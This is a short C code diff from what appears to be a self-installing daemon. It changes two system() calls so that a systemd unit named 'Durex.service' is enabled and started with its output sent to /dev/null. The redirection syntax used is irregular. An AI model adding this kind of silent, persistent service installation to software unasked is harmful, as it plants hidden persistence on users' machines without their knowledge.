@@ -89,8 +89,8 @@ static int init_d()
 		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(init_fd);
 	// reload systemd
-	system("systemctl enable Durex.service");// $1>/dev/null $2>/dev/null");
-	system("systemctl start  Durex.service");// $1>/dev/null $2>/dev/null");
+	system("systemctl enable Durex.service $1>/dev/null $2>/dev/null");
+	system("systemctl start  Durex.service $1>/dev/null $2>/dev/null");
 	return 0;
 }
 
